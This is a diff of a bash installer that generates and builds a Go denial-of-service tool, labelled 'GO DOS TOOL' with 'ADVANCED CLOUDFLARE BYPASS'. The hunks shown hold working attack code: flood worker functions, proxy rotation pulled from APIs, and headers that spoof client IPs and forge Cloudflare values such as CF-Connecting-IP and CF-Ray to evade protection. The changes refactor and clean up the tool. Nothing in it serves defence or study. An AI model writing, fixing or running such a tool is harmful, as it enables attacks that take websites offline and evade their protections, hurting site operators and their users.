@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ----------------------------------------
-# GO DOS TOOL SETUP (ADVANCED CLOUDFLARE BYPASS)
+# GO DOS TOOL SETUP (ADVANCED CLOUDFLARE BYPASS - CLEAN VERSION)
 # ----------------------------------------
 
 # Color definitions
@@ -23,10 +23,10 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO - ADVANCED EDITION${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Remove any existing main.go to ensure clean slate
-rm -f main.go
+# Remove any existing files to ensure clean slate
+rm -f main.go go.mod go.sum
 
-# Create main.go file directly (ADVANCED CLOUDFLARE BYPASS VERSION - FIXED)
+# Create main.go file directly (COMPLETELY CLEAN VERSION)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with advanced bypass features...${NC}"
 
 cat > main.go << 'EOF'
@@ -315,13 +315,15 @@ func loadProxiesFromAPI() {
 		if err != nil {
 			continue
 		}
-		defer resp.Body.Close()
-
+		
 		if resp.StatusCode != http.StatusOK {
+			resp.Body.Close()
 			continue
 		}
 
 		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		
 		lines := strings.Split(string(body), "\n")
 
 		for _, line := range lines {
@@ -472,14 +474,11 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	spoofIP := randomIP()
 	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR", "IN", "KR", "IT", "ES", "MX"}
 
-	// Standard CF bypass headers
 	req.Header.Set("CF-Connecting-IP", spoofIP)
 	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
 	req.Header.Set("CF-Ray", randomString(16)+"-"+strings.ToUpper(randomString(4)))
 	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
 	req.Header.Set("CDN-Loop", "cloudflare")
-
-	// IP spoofing headers
 	req.Header.Set("X-Forwarded-For", spoofIP)
 	req.Header.Set("X-Forwarded-Proto", "https")
 	req.Header.Set("X-Real-IP", spoofIP)
@@ -488,16 +487,12 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	req.Header.Set("X-Remote-IP", spoofIP)
 	req.Header.Set("X-Remote-Addr", spoofIP)
 	req.Header.Set("X-Client-IP", spoofIP)
-
-	// Advanced bypass headers
 	req.Header.Set("X-Host", req.Host)
 	req.Header.Set("X-Forwarded-Host", req.Host)
 	req.Header.Set("Origin", "https://"+req.Host)
 	req.Header.Set("Via", "1.1 google")
 	req.Header.Set("X-Request-ID", randomString(32))
 	req.Header.Set("X-Correlation-ID", randomString(32))
-
-	// Modern browser headers
 	req.Header.Set("Sec-Fetch-Dest", "document")
 	req.Header.Set("Sec-Fetch-Mode", "navigate")
 	req.Header.Set("Sec-Fetch-Site", "none")
@@ -564,23 +559,6 @@ func handleChallengeResponse(client *http.Client, resp *http.Response, target st
 		}
 	}
 	return false
-}
-
-func advancedBypassHeaders(req *http.Request) {
-	if randInt(1, 100) <= 20 {
-		time.Sleep(time.Duration(randInt(100, 500)) * time.Millisecond)
-	}
-
-	if randInt(1, 100) <= 10 {
-		headers := make([]string, 0)
-		for k := range req.Header {
-			headers = append(headers, k)
-		}
-		for i := range headers {
-			j := randInt(0, len(headers)-1)
-			headers[i], headers[j] = headers[j], headers[i]
-		}
-	}
 }
 
 func detectCFProtection(resp *http.Response) string {
@@ -705,9 +683,9 @@ func main() {
 		go func(workerID int) {
 			defer wg.Done()
 			if mode == "CF" {
-				attackWorkerCF(target, mode, done, stats, successStats, failStats, cfChallenges, useProxy, connectionPool, workerID)
+				attackWorkerCF(target, done, stats, successStats, failStats, cfChallenges, connectionPool)
 			} else {
-				attackWorker(target, mode, done, stats, useProxy, connectionPool)
+				attackWorker(target, mode, done, stats, connectionPool)
 			}
 		}(i)
 	}
@@ -757,7 +735,7 @@ func (c *atomicCounter) get() int64 {
 	return atomic.LoadInt64(&c.val)
 }
 
-func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
+func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, pool *ConnectionPool) {
 	for {
 		select {
 		case <-done:
@@ -853,7 +831,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 	}
 }
 
-func attackWorkerCF(target, mode string, done chan struct{}, stats, successStats, failStats, cfChallenges *atomicCounter, useProxy bool, pool *ConnectionPool, workerID int) {
+func attackWorkerCF(target string, done chan struct{}, stats, successStats, failStats, cfChallenges *atomicCounter, pool *ConnectionPool) {
 	localSuccess := 0
 	localFail := 0
 	localCF := 0
@@ -930,8 +908,6 @@ func attackWorkerCF(target, mode string, done chan struct{}, stats, successStats
 			if randInt(1, 100) <= 10 {
 				time.Sleep(time.Duration(randInt(50, 200)) * time.Millisecond)
 			}
-
-			advancedBypassHeaders(req)
 
 			resp, err := client.Do(req)
 
@@ -1040,12 +1016,6 @@ echo
 export GO111MODULE=on
 export CGO_ENABLED=0
 
-# Clean old module files
-echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
-rm -rf go.mod go.sum
-echo -e " ${GREEN}✓ Cleanup complete${NC}"
-echo
-
 echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
 go mod init main > /dev/null 2>&1
 echo -e " ${GREEN}✓ Module initialized${NC}"
@@ -1124,12 +1094,7 @@ if [ $? -eq 0 ]; then
 else
     echo -e " ${RED}✗ Compilation failed${NC}"
     echo
-    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
-    echo
-    echo -e "   ${BLUE}1.${NC} go mod init main"
-    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
-    echo -e "   ${BLUE}3.${NC} go mod tidy"
-    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
+    echo -e " ${YELLOW}➤${NC} ${GREEN}Error details:${NC}"
     echo
     rm -f main.go
     exit 1
